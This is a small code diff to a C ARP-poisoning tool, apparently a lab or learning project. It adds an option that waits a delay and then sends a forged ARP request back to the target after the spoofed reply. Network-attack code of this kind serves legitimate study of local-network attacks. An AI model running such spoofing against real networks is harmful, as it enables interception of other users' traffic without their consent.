@@ -39,4 +39,11 @@ void	arp_poison(t_malcom *mstruct)
 	ft_memcpy(devs.sip, &(ipdst.s_addr), IP_ALEN);
 	
 	send_arp(ARPOP_REPLY, mstruct, &devs, &send_from_addr);
+
+	if (mstruct->options.flags & MALC_OPT_POISON_REQBCK) {
+		printf("Wait %d seconds before sending back a request...\n", REQBCK_DELAY);
+		ft_sleep(REQBCK_DELAY);
+		send_arp(ARPOP_REQUEST, mstruct, &devs, &send_from_addr);
+		printf("ARP request sent back to target.\n");
+	}
 }
